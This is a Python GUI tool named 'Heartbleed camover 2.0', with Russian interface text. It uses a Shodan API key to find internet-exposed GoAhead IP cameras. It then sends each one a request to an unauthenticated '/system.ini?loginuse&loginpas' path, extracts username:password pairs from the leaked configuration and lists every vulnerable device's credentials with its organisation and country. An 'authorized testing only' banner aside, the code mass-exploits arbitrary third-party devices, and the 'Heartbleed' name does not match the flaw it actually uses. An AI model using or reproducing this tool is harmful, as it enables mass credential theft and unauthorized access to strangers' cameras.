import os
import sys
import subprocess

os.environ["TK_SILENCE_DEPRECATION"] = "1"


def _ensure_dependencies():
    if getattr(sys, "frozen", False):
        return

    try:
        import tkinter
    except Exception:
        raise SystemExit(
            "Tkinter не найден.\n"
            "Windows: обычно идет вместе с Python.\n"
            "Linux: sudo apt install python3-tk или python3-tkinter.\n"
            "macOS: желательно использовать python.org Python или brew python-tk."
        )

    try:
        import customtkinter
        import requests
        import shodan
    except ImportError:
        packages = ["customtkinter", "requests", "shodan"]

        commands = [
            [sys.executable, "-m", "pip", "install", "--upgrade", *packages],
            [sys.executable, "-m", "pip", "install", "--user", "--upgrade", *packages],
            [sys.executable, "-m", "pip", "install", "--break-system-packages", "--upgrade", *packages],
        ]

        for cmd in commands:
            try:
                subprocess.check_call(cmd)
                break
            except Exception:
                continue
        else:
            raise SystemExit(
                "Не получилось автоматически установить зависимости.\n"
                "Установи вручную:\n\n"
                "python3 -m pip install customtkinter requests shodan\n"
            )


_ensure_dependencies()

import re
import threading
import queue
import tkinter as tk
from tkinter import ttk, messagebox

import customtkinter as ctk
import requests
from shodan import Shodan

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass


APP_TITLE = "Heartbleed camover 2.0 gui"
SHODAN_QUERY = "GoAhead 5ccc069c403ebaf9f0171e9517f40e41"

USERNAMES = {
    "admin",
    "root",
    "administrator",
    "user",
    "guest",
    "operator",
    "service",
    "test",
    "default",
}


def ui_family():
    if sys.platform.startswith("win"):
        return "Segoe UI"
    if sys.platform == "darwin":
        return "SF Pro Text"
    return "Helvetica Neue"


def mono_family():
    if sys.platform.startswith("win"):
        return "Cascadia Mono"
    if sys.platform == "darwin":
        return "SF Mono"
    return "DejaVu Sans Mono"


UI_FAMILY = ui_family()
MONO_FAMILY = mono_family()


BG = "#090405"
PANEL = "#130608"
PANEL_2 = "#1b0a0d"
BORDER = "#5c1218"
TEXT = "#f4dede"
MUTED = "#9c6b72"
RED = "#ff2742"
RED_BTN = "#7c0d17"
RED_HOVER = "#a3101f"

GREEN_ROW_BG = "#00b546"
GREEN_ROW_FG = "#04170b"

SAFE_BG = "#150507"
SAFE_FG = "#d78d97"

SCAN_BG = "#0e0e12"
SCAN_FG = "#cfcfd6"

ERROR_BG = "#250409"
ERROR_FG = "#ff6b7a"


class App(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title(APP_TITLE)
        self.geometry("1180x760")
        self.minsize(1040, 680)
        self.configure(fg_color=BG)

        self.q = queue.Queue()
        self.stop_event = threading.Event()

        self.progress_max = 0
        self.found = 0
        self.scanned = 0
        self.vuln = 0
        self.safe = 0

        self._build_ui()
        self._append_log("Готов к работе. Используй только для разрешенного аудита.", "info")

        self.after(80, self._poll_queue)
        self.protocol("WM_DELETE_WINDOW", self._on_close)

    def _font(self, size=13, weight="normal"):
        return ctk.CTkFont(family=UI_FAMILY, size=size, weight=weight)

    def _build_ui(self):
        header = ctk.CTkFrame(self, fg_color="transparent")
        header.pack(fill="x", padx=22, pady=(18, 4))

        ctk.CTkLabel(
            header,
            text="HEARTBLEED CAMOVER 2.0",
            font=self._font(28, "bold"),
            text_color=RED
        ).pack(anchor="w")

        ctk.CTkLabel(
            header,
            text="Authorized camera security testing only / только разрешенные устройства",
            font=self._font(11),
            text_color=MUTED
        ).pack(anchor="w", pady=(0, 2))

        controls = ctk.CTkFrame(self, fg_color=PANEL, corner_radius=14, border_width=1, border_color=BORDER)
        controls.pack(fill="x", padx=22, pady=(10, 8))

        row = ctk.CTkFrame(controls, fg_color="transparent")
        row.pack(fill="x", padx=16, pady=14)

        ctk.CTkLabel(
            row,
            text="Shodan API Key",
            font=self._font(12, "bold"),
            text_color=MUTED
        ).pack(side="left", padx=(0, 10))

        self.api_entry = ctk.CTkEntry(
            row,
            placeholder_text="Введите Shodan API ключ",
            show="•",
            height=36,
            fg_color=PANEL_2,
            border_color=BORDER,
            border_width=1,
            text_color=TEXT,
            placeholder_text_color="#775056",
            font=self._font(13)
        )
        self.api_entry.pack(side="left", fill="x", expand=True, padx=(0, 10))

        self.show_var = ctk.BooleanVar(value=False)
        self.show_cb = ctk.CTkCheckBox(
            row,
            text="Show",
            variable=self.show_var,
            command=self._toggle_show,
            font=self._font(12),
            text_color=TEXT,
            checkbox_width=18,
            checkbox_height=18,
            border_color=BORDER,
            fg_color=RED_BTN,
            hover_color=RED_HOVER
        )
        self.show_cb.pack(side="left", padx=(0, 14))

        self.start_btn = ctk.CTkButton(
            row,
            text="Start Scanning",
            command=self._start_scan,
            width=150,
            height=36,
            corner_radius=10,
            fg_color=RED_BTN,
            hover_color=RED_HOVER,
            text_color="#fff2f3",
            font=self._font(13, "bold")
        )
        self.start_btn.pack(side="left", padx=(0, 8))

        self.stop_btn = ctk.CTkButton(
            row,
            text="Stop",
            command=self._stop_scan,
            width=90,
            height=36,
            corner_radius=10,
            fg_color="#33090e",
            hover_color="#4d0d14",
            text_color="#ff9aa5",
            font=self._font(13, "bold"),
            state="disabled"
        )
        self.stop_btn.pack(side="left")

        stats = ctk.CTkFrame(self, fg_color="transparent")
        stats.pack(fill="x", padx=22, pady=(0, 8))

        for i in range(4):
            stats.grid_columnconfigure(i, weight=1, uniform="stats")

        self.stat_found = self._make_card(stats, "FOUND", RED)
        self.stat_found.grid(row=0, column=0, sticky="ew", padx=(0, 8))

        self.stat_scanned = self._make_card(stats, "SCANNED", "#ff7a8a")
        self.stat_scanned.grid(row=0, column=1, sticky="ew", padx=4)

        self.stat_vuln = self._make_card(stats, "VULNERABLE", "#29e071")
        self.stat_vuln.grid(row=0, column=2, sticky="ew", padx=4)

        self.stat_safe = self._make_card(stats, "SAFE / OFFLINE", "#8f92a6")
        self.stat_safe.grid(row=0, column=3, sticky="ew", padx=(4, 0))

        self.progress = ctk.CTkProgressBar(
            self,
            height=10,
            corner_radius=6,
            fg_color="#22090c",
            progress_color=RED
        )
        self.progress.pack(fill="x", padx=22, pady=(0, 8))
        self.progress.set(0)

        table_panel = ctk.CTkFrame(self, fg_color=PANEL, corner_radius=14, border_width=1, border_color=BORDER)
        table_panel.pack(fill="both", expand=True, padx=22, pady=(0, 8))

        ctk.CTkLabel(
            table_panel,
            text="RESULTS",
            font=self._font(12, "bold"),
            text_color=MUTED
        ).pack(anchor="w", padx=16, pady=(12, 0))

        holder = tk.Frame(table_panel, bg="#0d0507")
        holder.pack(fill="both", expand=True, padx=12, pady=10)

        self.style = ttk.Style(self)
        try:
            self.style.theme_use("clam")
        except Exception:
            pass

        self.style.configure(
            "Heart.Treeview",
            background="#0d0507",
            fieldbackground="#0d0507",
            foreground="#e9d7d9",
            rowheight=26,
            font=(MONO_FAMILY, 10),
            borderwidth=0,
            focuscolor="#0d0507"
        )

        self.style.configure(
            "Heart.Treeview.Heading",
            background="#190709",
            foreground=RED,
            font=(UI_FAMILY, 10, "bold"),
            relief="flat",
            padding=(8, 6)
        )

        self.style.map(
            "Heart.Treeview",
            background=[("selected", "#31090f")],
            foreground=[("selected", "#ffffff")]
        )

        self.style.map(
            "Heart.Treeview.Heading",
            background=[("active", "#23080b")]
        )

        columns = ("status", "address", "result", "org", "country")

        self.tree = ttk.Treeview(
            holder,
            columns=columns,
            show="headings",
            style="Heart.Treeview",
            selectmode="browse"
        )

        self.tree.heading("status", text="STATUS")
        self.tree.heading("address", text="ADDRESS")
        self.tree.heading("result", text="RESULT / CREDS")
        self.tree.heading("org", text="ORG")
        self.tree.heading("country", text="CC")

        self.tree.column("status", width=85, anchor="center", stretch=False)
        self.tree.column("address", width=175, anchor="w", stretch=False)
        self.tree.column("result", width=300, anchor="w", stretch=True)
        self.tree.column("org", width=220, anchor="w", stretch=True)
        self.tree.column("country", width=60, anchor="center", stretch=False)

        self.tree.tag_configure(
            "vuln",
            background=GREEN_ROW_BG,
            foreground=GREEN_ROW_FG,
            font=(MONO_FAMILY, 10, "bold")
        )

        self.tree.tag_configure(
            "safe",
            background=SAFE_BG,
            foreground=SAFE_FG
        )

        self.tree.tag_configure(
            "scan",
            background=SCAN_BG,
            foreground=SCAN_FG
        )

        self.tree.tag_configure(
            "error",
            background=ERROR_BG,
            foreground=ERROR_FG
        )

        scroll = ttk.Scrollbar(holder, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=scroll.set)

        self.tree.pack(side="left", fill="both", expand=True)
        scroll.pack(side="right", fill="y")

        log_panel = ctk.CTkFrame(self, fg_color=PANEL, corner_radius=14, border_width=1, border_color=BORDER)
        log_panel.pack(fill="x", padx=22, pady=(0, 8))

        ctk.CTkLabel(
            log_panel,
            text="EVENT LOG",
            font=self._font(12, "bold"),
            text_color=MUTED
        ).pack(anchor="w", padx=16, pady=(12, 0))

        self.log_text = tk.Text(
            log_panel,
            height=5,
            bg="#060304",
            fg="#d8b3b8",
            insertbackground=RED,
            relief="flat",
            font=(MONO_FAMILY, 10),
            padx=10,
            pady=8,
            state="disabled",
            highlightthickness=0,
            bd=0
        )
        self.log_text.pack(fill="x", padx=12, pady=(6, 12))

        self.log_text.tag_configure("info", foreground="#ff9aa8")
        self.log_text.tag_configure("success", foreground="#3cf07a", font=(MONO_FAMILY, 10, "bold"))
        self.log_text.tag_configure("warn", foreground="#ffb35c")
        self.log_text.tag_configure("error", foreground="#ff4d5e", font=(MONO_FAMILY, 10, "bold"))

        self.status_label = ctk.CTkLabel(
            self,
            text="Ready",
            anchor="w",
            font=self._font(11),
            text_color=MUTED
        )
        self.status_label.pack(fill="x", padx=26, pady=(0, 12))

    def _make_card(self, parent, title, accent):
        card = ctk.CTkFrame(
            parent,
            fg_color=PANEL,
            corner_radius=14,
            border_width=1,
            border_color=BORDER
        )

        ctk.CTkLabel(
            card,
            text=title,
            font=self._font(10, "bold"),
            text_color=MUTED
        ).pack(anchor="w", padx=14, pady=(10, 0))

        value = ctk.CTkLabel(
            card,
            text="0",
            font=self._font(22, "bold"),
            text_color=accent
        )
        value.pack(anchor="w", padx=14, pady=(0, 10))

        return value

    def _toggle_show(self):
        self.api_entry.configure(show="" if self.show_var.get() else "•")

    def _append_log(self, text, tag="info"):
        self.log_text.configure(state="normal")
        self.log_text.insert("end", text + "\n", tag)
        self.log_text.see("end")
        self.log_text.configure(state="disabled")

    def _clear_ui(self):
        for iid in self.tree.get_children():
            self.tree.delete(iid)

        self.log_text.configure(state="normal")
        self.log_text.delete("1.0", "end")
        self.log_text.configure(state="disabled")

        self.found = 0
        self.scanned = 0
        self.vuln = 0
        self.safe = 0
        self.progress_max = 0

        self.progress.set(0)

        self.stat_found.configure(text="0")
        self.stat_scanned.configure(text="0")
        self.stat_vuln.configure(text="0")
        self.stat_safe.configure(text="0")

    def _start_scan(self):
        api_key = self.api_entry.get().strip()
        if not api_key:
            messagebox.showwarning(APP_TITLE, "Введите Shodan API ключ.")
            return

        self._clear_ui()
        self.stop_event.clear()

        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        self.status_label.configure(text="Scanning in progress...")

        threading.Thread(target=self._worker, args=(api_key,), daemon=True).start()

    def _stop_scan(self):
        self.stop_event.set()
        self.stop_btn.configure(state="disabled")
        self._append_log("Остановка сканирования запрошена...", "warn")

    def _worker(self, api_key):
        try:
            self.q.put({"type": "log", "text": "Авторизация в Shodan...", "tag": "info"})

            api = Shodan(api_key)
            results = api.search(SHODAN_QUERY)

            matches = results.get("matches", []) if isinstance(results, dict) else []
            self.found = len(matches)

            self.q.put({
                "type": "stats",
                "found": self.found,
                "scanned": self.scanned,
                "vuln": self.vuln,
                "safe": self.safe
            })

            self.q.put({"type": "progress", "max": self.found, "value": 0})
            self.q.put({"type": "log", "text": f"Найдено устройств в Shodan: {self.found}", "tag": "success"})

            for idx, match in enumerate(matches, 1):
                if self.stop_event.is_set():
                    break

                ip = match.get("ip_str", "?")
                port = match.get("port", 80)
                address = f"{ip}:{port}"

                org = (match.get("org") or "Unknown").strip()
                location = match.get("location") or {}
                country = (location.get("country_code") or "??").strip()

                iid = f"row-{idx}"

                self.q.put({
                    "type": "insert",
                    "iid": iid,
                    "values": ("SCAN", address, "checking...", org, country),
                    "tag": "scan"
                })

                creds = self._exploit(address)

                if creds:
                    self.vuln += 1
                    result = "; ".join(creds)

                    self.q.put({
                        "type": "update",
                        "iid": iid,
                        "values": ("VULN", address, result, org, country),
                        "tag": "vuln"
                    })

                    self.q.put({
                        "type": "log",
                        "text": f"[VULN] {address} -> {result}",
                        "tag": "success"
                    })
                else:
                    self.safe += 1

                    self.q.put({
                        "type": "update",
                        "iid": iid,
                        "values": ("SAFE", address, "not vulnerable / offline / patched", org, country),
                        "tag": "safe"
                    })

                self.scanned += 1

                self.q.put({
                    "type": "stats",
                    "found": self.found,
                    "scanned": self.scanned,
                    "vuln": self.vuln,
                    "safe": self.safe
                })

                self.q.put({"type": "progress", "value": self.scanned})

            if self.stop_event.is_set():
                self.q.put({"type": "log", "text": "Сканирование остановлено пользователем.", "tag": "warn"})
                self.q.put({"type": "status", "text": "Stopped"})
            else:
                self.q.put({
                    "type": "log",
                    "text": f"Сканирование завершено. Уязвимых устройств: {self.vuln}.",
                    "tag": "success"
                })
                self.q.put({"type": "status", "text": "Done"})

        except Exception as exc:
            self.q.put({"type": "log", "text": f"Ошибка: {exc}", "tag": "error"})
            self.q.put({"type": "status", "text": "Error"})
        finally:
            self.q.put({"type": "finished"})

    @staticmethod
    def _exploit(address):
        try:
            response = requests.get(
                f"http://{address}/system.ini?loginuse&loginpas",
                verify=False,
                timeout=3
            )
        except Exception:
            return []

        if response.status_code != 200:
            return []

        strings = re.findall(r"[ -~]{4,}", response.text)
        creds = []
        seen = set()

        for i in range(len(strings) - 1):
            token = strings[i]
            token_lower = token.lower()

            if token_lower in USERNAMES:
                password = strings[i + 1]

                if password.lower() not in USERNAMES:
                    pair = f"{token}:{password}"

                    if pair not in seen:
                        seen.add(pair)
                        creds.append(pair)

        return creds

    def _poll_queue(self):
        try:
            while True:
                item = self.q.get_nowait()
                item_type = item.get("type")

                if item_type == "log":
                    self._append_log(item.get("text", ""), item.get("tag", "info"))

                elif item_type == "status":
                    self.status_label.configure(text=item.get("text", ""))

                elif item_type == "stats":
                    self.stat_found.configure(text=str(item.get("found", 0)))
                    self.stat_scanned.configure(text=str(item.get("scanned", 0)))
                    self.stat_vuln.configure(text=str(item.get("vuln", 0)))
                    self.stat_safe.configure(text=str(item.get("safe", 0)))

                elif item_type == "progress":
                    if "max" in item:
                        self.progress_max = item.get("max", 0)

                    if self.progress_max > 0:
                        self.progress.set(item.get("value", 0) / self.progress_max)
                    else:
                        self.progress.set(0)

                elif item_type == "insert":
                    iid = item.get("iid")
                    if iid and not self.tree.exists(iid):
                        self.tree.insert(
                            "",
                            "end",
                            iid=iid,
                            values=item.get("values"),
                            tags=(item.get("tag", "scan"),)
                        )
                        self.tree.see(iid)

                elif item_type == "update":
                    iid = item.get("iid")
                    if iid and self.tree.exists(iid):
                        self.tree.item(
                            iid,
                            values=item.get("values"),
                            tags=(item.get("tag", "safe"),)
                        )

                elif item_type == "finished":
                    self.start_btn.configure(state="normal")
                    self.stop_btn.configure(state="disabled")

        except queue.Empty:
            pass

        self.after(80, self._poll_queue)

    def _on_close(self):
        self.stop_event.set()
        self.destroy()


if __name__ == "__main__":
    ctk.set_appearance_mode("dark")

    try:
        ctk.set_default_color_theme("dark-blue")
    except Exception:
        pass

    app = App()
    app.mainloop()